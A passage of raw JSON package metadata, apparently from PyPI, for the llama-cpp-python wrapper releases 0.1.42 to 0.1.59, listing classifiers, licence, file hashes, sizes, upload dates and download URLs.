Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.42/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.42","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"8dbb48129f3696fcc125fac1c91a5a6df5ab472e561d74ed5818e6fca748a432","md5":"258092d25ef551e5f1c88bf8c4382d85","sha256":"6db1b5d675fe89b5a36c54635e58d67174ffa4a48c7134ca658de490557b5ea3"},"downloads":-1,"filename":"llama_cpp_python-0.1.42.tar.gz","has_sig":false,"md5_digest":"258092d25ef551e5f1c88bf8c4382d85","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1131980,"upload_time":"2023-05-04T16:23:18","upload_time_iso_8601":"2023-05-04T16:23:18.504945Z","url":"https://files.pythonhosted.org/packages/8d/bb/48129f3696fcc125fac1c91a5a6df5ab472e561d74ed5818e6fca748a432/llama_cpp_python-0.1.42.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.43":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.43/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.43","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"eb43ac841dc1a3f5f618e4546ce69fe7da0d976cb141c92b8d1f735f2baf0b85","md5":"44002dcc1fa461ca26016155214b7f7f","sha256":"cb67601c14db458e790ee2ae1be80636e6b90b94fc4ca1ecbfb40dde40f4498f"},"downloads":-1,"filename":"llama_cpp_python-0.1.43.tar.gz","has_sig":false,"md5_digest":"44002dcc1fa461ca26016155214b7f7f","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1132093,"upload_time":"2023-05-05T02:01:33","upload_time_iso_8601":"2023-05-05T02:01:33.533640Z","url":"https://files.pythonhosted.org/packages/eb/43/ac841dc1a3f5f618e4546ce69fe7da0d976cb141c92b8d1f735f2baf0b85/llama_cpp_python-0.1.43.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.44":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.44/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.44","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"2969b73ae145d6f40683656f537b8526ca27e8348c7ff9af9c014a6a723fda5f","md5":"424512891ad3028eff44fc2117a345c2","sha256":"6c4706aadcae3d0d42bccf351e34537488649ff81f620f50a59e131b5f4bab21"},"downloads":-1,"filename":"llama_cpp_python-0.1.44.tar.gz","has_sig":false,"md5_digest":"424512891ad3028eff44fc2117a345c2","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1136699,"upload_time":"2023-05-07T07:31:01","upload_time_iso_8601":"2023-05-07T07:31:01.013504Z","url":"https://files.pythonhosted.org/packages/29/69/b73ae145d6f40683656f537b8526ca27e8348c7ff9af9c014a6a723fda5f/llama_cpp_python-0.1.44.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.45":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.45/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.45","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"62b7299b9d537037a95d4433498c73c1a8024de230a26d0c94b3e889364038d4","md5":"57714f29a8c92cc8e10a8c6dd494678f","sha256":"017064e175ad0f5a67a1bf94887929cb7e39258bcd73114c9b8b60fc755934c4"},"downloads":-1,"filename":"llama_cpp_python-0.1.45.tar.gz","has_sig":false,"md5_digest":"57714f29a8c92cc8e10a8c6dd494678f","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1137075,"upload_time":"2023-05-08T00:22:19","upload_time_iso_8601":"2023-05-08T00:22:19.942754Z","url":"https://files.pythonhosted.org/packages/62/b7/299b9d537037a95d4433498c73c1a8024de230a26d0c94b3e889364038d4/llama_cpp_python-0.1.45.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.46":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.46/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.46","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c212450986c9506525096cc77fcb6584ee02ec7d0017df0d34e6c79b9dba5a58","md5":"a1abf02ac54557297445b15b86f27b26","sha256":"358159520cafec32d3e5f7179dc75c26c63e448c9dd6d118b86dccb360bd3e82"},"downloads":-1,"filename":"llama_cpp_python-0.1.46.tar.gz","has_sig":false,"md5_digest":"a1abf02ac54557297445b15b86f27b26","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1137251,"upload_time":"2023-05-08T18:23:20","upload_time_iso_8601":"2023-05-08T18:23:20.793362Z","url":"https://files.pythonhosted.org/packages/c2/12/450986c9506525096cc77fcb6584ee02ec7d0017df0d34e6c79b9dba5a58/llama_cpp_python-0.1.46.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.47":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.47/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.47","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"289511fcced0778cb9b82a81cd61c93760a379527ef13d90a66254fdc2e982df","md5":"d8a826866c6e6bd89edc7644a0ca7ee0","sha256":"879ff09c4d3cfea0a053c07207ce0c8238167761b60b9971f1e4f4c85abc0309"},"downloads":-1,"filename":"llama_cpp_python-0.1.47.tar.gz","has_sig":false,"md5_digest":"d8a826866c6e6bd89edc7644a0ca7ee0","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1137271,"upload_time":"2023-05-08T18:48:33","upload_time_iso_8601":"2023-05-08T18:48:33.344144Z","url":"https://files.pythonhosted.org/packages/28/95/11fcced0778cb9b82a81cd61c93760a379527ef13d90a66254fdc2e982df/llama_cpp_python-0.1.47.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.48":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.48/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.48","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"350463f43ff24bd8948abbe2d7c9c3e3d235c0e7501ec8b1e72d01676051f75d","md5":"4f6cba6b70466ec0cd44a49aff476d5a","sha256":"91907ec95d24c20d8cff1086c0be7dfc2f512b173e0b76f184331e1ee4faf138"},"downloads":-1,"filename":"llama_cpp_python-0.1.48.tar.gz","has_sig":false,"md5_digest":"4f6cba6b70466ec0cd44a49aff476d5a","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1142825,"upload_time":"2023-05-08T22:53:39","upload_time_iso_8601":"2023-05-08T22:53:39.416153Z","url":"https://files.pythonhosted.org/packages/35/04/63f43ff24bd8948abbe2d7c9c3e3d235c0e7501ec8b1e72d01676051f75d/llama_cpp_python-0.1.48.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.49":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.49/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.49","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1b60be610e7e95eb53e949ac74024b30d5fa763244928b07a16815d16643b7ab","md5":"32b8fa1405a69b34f171d6e13fae4f0b","sha256":"f22d3f39a8d19e187a86114c81296c3d2de4f31cbe1c7bd887d543f025825820"},"downloads":-1,"filename":"llama_cpp_python-0.1.49.tar.gz","has_sig":false,"md5_digest":"32b8fa1405a69b34f171d6e13fae4f0b","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1146908,"upload_time":"2023-05-12T01:59:45","upload_time_iso_8601":"2023-05-12T01:59:45.152024Z","url":"https://files.pythonhosted.org/packages/1b/60/be610e7e95eb53e949ac74024b30d5fa763244928b07a16815d16643b7ab/llama_cpp_python-0.1.49.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.5":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.5/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.5","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"cd32e2380800128e64542f719c3d7287b2818e7234e268298b95273164cb0a3d","md5":"d58d85562f2173e3a15160da7e29581e","sha256":"a11244929b587bc9bb611f73b98231a4a06514403565aaceebb01dd666e05c22"},"downloads":-1,"filename":"llama_cpp_python-0.1.5.tar.gz","has_sig":false,"md5_digest":"d58d85562f2173e3a15160da7e29581e","packagetype":"sdist","python_version":"source","requires_python":null,"size":539437,"upload_time":"2023-03-25T16:13:10","upload_time_iso_8601":"2023-03-25T16:13:10.927412Z","url":"https://files.pythonhosted.org/packages/cd/32/e2380800128e64542f719c3d7287b2818e7234e268298b95273164cb0a3d/llama_cpp_python-0.1.5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.50":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.50/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.50","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"822c9614ef76422168fde5326095559f271a22b1926185add8ae739901e113b9","md5":"e03b78bc7d3235c41eeeee1ee38dcddd","sha256":"e305ae1b9f135f94afd8dd227701e6a1cd36db9c28f736b830ec364127c00bb9"},"downloads":-1,"filename":"llama_cpp_python-0.1.50.tar.gz","has_sig":false,"md5_digest":"e03b78bc7d3235c41eeeee1ee38dcddd","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1168927,"upload_time":"2023-05-14T04:06:27","upload_time_iso_8601":"2023-05-14T04:06:27.399805Z","url":"https://files.pythonhosted.org/packages/82/2c/9614ef76422168fde5326095559f271a22b1926185add8ae739901e113b9/llama_cpp_python-0.1.50.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.51":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.51/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.51","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f96578748102cca92fb148e111c41827433ecc2cb79eed9de0a72a4d7a4361c0","md5":"63edbdd96cc833b42c5daff065bab822","sha256":"97b933df56645722773b47033e94cd0ab2b72ec6a9562596ab5a6c5c6486ff6b"},"downloads":-1,"filename":"llama_cpp_python-0.1.51.tar.gz","has_sig":false,"md5_digest":"63edbdd96cc833b42c5daff065bab822","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1174718,"upload_time":"2023-05-19T07:23:48","upload_time_iso_8601":"2023-05-19T07:23:48.209861Z","url":"https://files.pythonhosted.org/packages/f9/65/78748102cca92fb148e111c41827433ecc2cb79eed9de0a72a4d7a4361c0/llama_cpp_python-0.1.51.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.52":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.52/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.52","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"87cb21c00f6f5b3a680671cb9c7e7ec5e07a6c03df70e28cd54f6197744c1f12","md5":"09b272e1e24ba663c2111502bd7691c0","sha256":"7869c8f63a6d8ed494de4ee47f74dbf4fa14b7ca5c5d8b1c0e1d87b1d9239139"},"downloads":-1,"filename":"llama_cpp_python-0.1.52.tar.gz","has_sig":false,"md5_digest":"09b272e1e24ba663c2111502bd7691c0","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1174738,"upload_time":"2023-05-20T12:55:31","upload_time_iso_8601":"2023-05-20T12:55:31.373035Z","url":"https://files.pythonhosted.org/packages/87/cb/21c00f6f5b3a680671cb9c7e7ec5e07a6c03df70e28cd54f6197744c1f12/llama_cpp_python-0.1.52.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.53":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.53/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.53","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d68dd1700e37bd9b8965154e12008620e3bd3ed7ed585ad86650294074577629","md5":"ff78d3cfa89a8c1ba160daff97484846","sha256":"3402a6f08e00c234834a69caba729965f1d3d43cdd23b1426ad86410147e2d73"},"downloads":-1,"filename":"llama_cpp_python-0.1.53.tar.gz","has_sig":false,"md5_digest":"ff78d3cfa89a8c1ba160daff97484846","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1378407,"upload_time":"2023-05-21T23:25:43","upload_time_iso_8601":"2023-05-21T23:25:43.093459Z","url":"https://files.pythonhosted.org/packages/d6/8d/d1700e37bd9b8965154e12008620e3bd3ed7ed585ad86650294074577629/llama_cpp_python-0.1.53.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.54":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.54/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.54","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"24a7e2904574d326e24338aab2e5fd618f007ef8b51c2a29618791f9c24269e2","md5":"82151649a0faf5ce8899cbec4b5c006d","sha256":"cb14545628b037ee70aef2e36fb9a1a401ff6063fe07b0d8874e385e3919d9c5"},"downloads":-1,"filename":"llama_cpp_python-0.1.54.tar.gz","has_sig":false,"md5_digest":"82151649a0faf5ce8899cbec4b5c006d","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1383507,"upload_time":"2023-05-23T03:52:29","upload_time_iso_8601":"2023-05-23T03:52:29.410849Z","url":"https://files.pythonhosted.org/packages/24/a7/e2904574d326e24338aab2e5fd618f007ef8b51c2a29618791f9c24269e2/llama_cpp_python-0.1.54.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.55":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.55/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.55","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b29b15a40971444775d7aa5aee934991fa97eee285ae3a77c98c70c382f2ed60","md5":"b0c8cf249f7d439c0f7554b4bf6f2deb","sha256":"1bc749f314a979c601b2dae22eb1f2d63fe791bc1237cce24d36b4f856be8ca2"},"downloads":-1,"filename":"llama_cpp_python-0.1.55.tar.gz","has_sig":false,"md5_digest":"b0c8cf249f7d439c0f7554b4bf6f2deb","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1388870,"upload_time":"2023-05-26T21:24:01","upload_time_iso_8601":"2023-05-26T21:24:01.317222Z","url":"https://files.pythonhosted.org/packages/b2/9b/15a40971444775d7aa5aee934991fa97eee285ae3a77c98c70c382f2ed60/llama_cpp_python-0.1.55.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.56":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.56/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.56","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"2ed736eccf10a611e2f3040cec775b9734ea51cf9938b2d911e30cbf71dd321b","md5":"70a38b39569213ba2294c44f54d995de","sha256":"35aa5a0abbfa81d6317519701aed758a06152e471c525ac399ca42340822df42"},"downloads":-1,"filename":"llama_cpp_python-0.1.56.tar.gz","has_sig":false,"md5_digest":"70a38b39569213ba2294c44f54d995de","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1395413,"upload_time":"2023-05-30T07:09:10","upload_time_iso_8601":"2023-05-30T07:09:10.780594Z","url":"https://files.pythonhosted.org/packages/2e/d7/36eccf10a611e2f3040cec775b9734ea51cf9938b2d911e30cbf71dd321b/llama_cpp_python-0.1.56.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.57":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.57/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.57","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"4de5b337c9e7330695eb5efa2329d25b2d964fe10364429698c89140729ebaaf","md5":"f8cc9a5525906489eaec20adfa0d5389","sha256":"a74e51723e467afeda8f9e5983a6f295a721416df620d3b6a0be493ef2602569"},"downloads":-1,"filename":"llama_cpp_python-0.1.57.tar.gz","has_sig":false,"md5_digest":"f8cc9a5525906489eaec20adfa0d5389","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1399901,"upload_time":"2023-06-01T03:27:25","upload_time_iso_8601":"2023-06-01T03:27:25.318791Z","url":"https://files.pythonhosted.org/packages/4d/e5/b337c9e7330695eb5efa2329d25b2d964fe10364429698c89140729ebaaf/llama_cpp_python-0.1.57.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.59":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.59/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for 